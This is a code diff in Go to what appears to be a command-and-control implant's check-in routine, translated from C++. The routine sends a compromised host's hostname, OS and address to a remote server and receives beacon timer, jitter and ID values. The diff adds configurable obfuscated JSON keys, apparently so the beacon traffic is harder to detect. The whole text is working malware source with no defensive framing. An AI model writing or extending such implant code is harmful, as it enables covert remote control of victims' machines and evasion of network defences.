@@ -210,13 +210,6 @@ func PostRequest(urlStr string, dataPayload string, compressData bool) (int, str
 	return resp.StatusCode, responseBody, nil
 }
 
-// --- Structs for JSON (de)serialization ---
-type ConnectionRequestData struct {
-	Name    string `json:"name"`
-	OS      string `json:"os"`
-	Address string `json:"address"`
-}
-
 // Updated to use int for Timer and Jitter
 type ConnectionResponseData struct {
 	Timer  int    `json:"timer"`
@@ -224,7 +217,6 @@ type ConnectionResponseData struct {
 	Jitter int    `json:"jitter"`
 }
 
-// httpConnection translates the C++ httpConnection function.
 // Returns: timer, id, jitter, error
 // Updates global currentID, currentTimer, currentJitter on success.
 func HTTPConnection(address string) (int, string, int, error) {
@@ -242,13 +234,25 @@ func HTTPConnection(address string) (int, string, int, error) {
 	connectURL := GenerateConnectionURL()
 	logger.Log("Connection URL: " + connectURL)
 
-	requestPayload := ConnectionRequestData{
-		Name:    hostname,
-		OS:      config.OsIdentifier,
-		Address: "127.0.0.1", // As per C++ example
-	}
+	keyName := config.Obfuscation.Generic.ImplantInfo.Name
+	logger.Log("Obfuscation key for 'name': " + keyName)
+	keyOS := config.Obfuscation.Generic.ImplantInfo.OS
+	logger.Log("Obfuscation key for 'os': " + keyOS)
+	keyAddr := config.Obfuscation.Generic.ImplantInfo.Address
+	logger.Log("Obfuscation key for 'address': " + keyAddr)
+	valName := hostname
+	valOS := config.OsIdentifier
+	valAddr := config.URL
 
-	jsonDataBytes, err := json.Marshal(requestPayload)
+	// Build dynamic JSON with obfuscated keys
+	payload := map[string]string{
+		keyName: valName,
+		keyOS:   valOS,
+		keyAddr: valAddr,
+	}
+	logger.Log(fmt.Sprintf("Connection payload: %+v", payload))
+
+	jsonDataBytes, err := json.Marshal(payload)
 	if err != nil {
 		logger.Error("Failed to marshal connection request JSON: " + err.Error())
 		return -1, "", -1, fmt.Errorf("failed to marshal connection JSON: %w", err)
@@ -259,7 +263,6 @@ func HTTPConnection(address string) (int, string, int, error) {
 		logger.Error("httpConnection POST request to " + connectURL + " failed: " + postErr.Error())
 		return -1, "", -1, fmt.Errorf("postRequest in httpConnection failed: %w", postErr)
 	}
-	// C++ check `if (response_code == -1)` is covered by `postErr != nil`
 
 	if responseCode != http.StatusOK { // Not 200
 		err := fmt.Errorf("server at %s responded with error in httpConnection: %d %s", connectURL, responseCode, responseBody)
@@ -268,16 +271,17 @@ func HTTPConnection(address string) (int, string, int, error) {
 	}
 
 	logger.Log("httpConnection to " + connectURL + " succeeded. Parsing response...")
-	var parsedResponse ConnectionResponseData
+	var parsedResponse map[string]interface{}
+
 	if err := json.Unmarshal([]byte(responseBody), &parsedResponse); err != nil {
 		logger.Error("JSON parsing failed in httpConnection for response from " + connectURL + ": " + err.Error())
 		return -1, "", -1, fmt.Errorf("failed to parse JSON response from %s: %w. Body: %s", connectURL, err, responseBody)
 	}
 
-	// Removed strconv.Atoi calls; use unmarshaled int values directly.
-	timerVal := parsedResponse.Timer
-	jitterVal := parsedResponse.Jitter
-	idVal := parsedResponse.UUID
+	timerVal := int(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Timer].(float64))
+	jitterVal := int(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Jitter].(float64))
+	idVal := parsedResponse[config.Obfuscation.Generic.ImplantInfo.UUID].(string)
+
 	if idVal == "" {
 		logger.Error("Received empty 'uuid' in httpConnection response from " + connectURL)
 		return -1, "", -1, fmt.Errorf("empty 'uuid' in response from %s", connectURL)
